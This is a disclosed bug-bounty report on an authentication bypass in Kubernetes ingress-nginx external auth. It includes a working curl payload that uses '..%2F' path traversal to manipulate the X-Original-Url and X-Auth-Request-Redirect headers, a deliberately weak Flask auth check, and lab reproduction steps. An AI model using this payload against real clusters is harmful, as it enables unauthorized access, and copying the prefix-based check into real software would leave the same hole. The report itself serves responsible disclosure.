# Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`)

## Report Details
- **Report ID**: 1357948
- **URL**: https://hackerone.com/reports/1357948
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-10-03T19:44:41.551Z
- **Disclosed**: 2022-04-23T07:07:08.925Z

## Reporter
- **Username**: thisbug
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
Sending request with `<public-service>..%2F<protected-service>` allows to manipulate headers:

* X-Original-Url
* X-Auth-Request-Redirect

due to that manipulation external auth service could make wrong decision and return 204 instead of 401/403. **To be clear: manipulation of those headers give no possibility to kubernetes user to make any proper decisions based on those headers. ** This way allowing anonymous access to public service and trying to protect access to protected-service by e.g. api-key is not possible.

{F1469913}

Example:
With this call `curl -v http://app.test/public-service/..%2Fprotected-service/protected` external auth configured on ingress using `nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify` will get following headers:
```
X-Request-Id: 7d979c82ca55141ed0d58655fbaac586
Host: auth-service.default.svc.cluster.local
X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
X-Original-Method: GET
X-Sent-From: nginx-ingress-controller
X-Real-Ip: 192.168.99.1
X-Forwarded-For: 192.168.99.1
X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
Connection: close
User-Agent: curl/7.75.0
Accept: */*
```
Both headers `X-Original-Url` and `X-Auth-Request-Redirect` are manipulated. 

How this auth-service can parse request? Here is simple example of python and Flask:
```
api_key = request.headers.get('X-Api-Key')
request_redirect = request.headers.get('X-Auth-Request-Redirect')

if request_redirect and request_redirect.startswith("/public-service/"):
    return Response(status = HTTPStatus.NO_CONTENT)

if api_key == "secret-api-key":  
    return Response(status = HTTPStatus.NO_CONTENT)

return Response(status = HTTPStatus.UNAUTHORIZED)
```

## Kubernetes Version:
minikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043
Kubernetesa v1.22.2 on Docker 20.10.8

## Component Version:
k8s.gcr.io/ingress-nginx/controller:v1.0.0-beta.3@sha256:44a7a06b71187a4529b0a9edee5cc22bdf71b414470eff696c3869ea8d90a695

## Steps To Reproduce:

  1. Download project in attachment: F1469916
  2. Install minikube
  3. Enable addon ingress and ingress-dns
  4. Build docker images:

    * `cd auth-service; docker build -t auth-service:0.0.4 .`
    * `cd protected-service; docker build -t protected-service:0.0.1 .`
    * `cd public-service; docker build -t public-service:0.0.1 .`

  5. push docker images into minikube:

    * `minikube image load auth-service:0.0.4`
    * `minikube image load protected-service:0.0.1`
    * `minikube image load public-service:0.0.1`

  6. apply kubernetes configuration: `kubectl apply -f app.yaml`

To access public service: `curl -v http://app.test/public-service/public`
To access protected service: `curl -v http://app.test/protected-service/protected -H "X-Api-Key: secret-api-key"`
To access protected service bypassing authentication: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`

## Supporting Material/References:

  * in F1469916 - project consist of 2 services: public and protected. Access to public should be available for anyone and to protected only with `X-Api-Key` header. auth-service is protecting access and configured as external auth on ingress.
    * app.yaml - whole configuration
    * auth-service, protected-service, public-service - directories with Dockerfiles to build

## Additional note
At first I have found this vulnerability in old version of ingress-nginx. It was 0.70.0. With this old version bypass was working without encoding of / to %2F.
e.g. `curl -v http://app.test/public-service/../protected-service/protected`
I was not able to reproduce it locally with minikube (couldn't install old ingress addon), but there is possibility that for some older versions of ingress-nginx you don't need to encode / to %2F.

## Impact

Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`). 

Attacker can manipulate `X-Original-Url` and `X-Auth-Request-Redirect` headers. Due to this kubernetes user is not able to make safe assumption on those headers.

## Attachments
- h1-1.png
- k8s-ingress-auth-bypass.zip
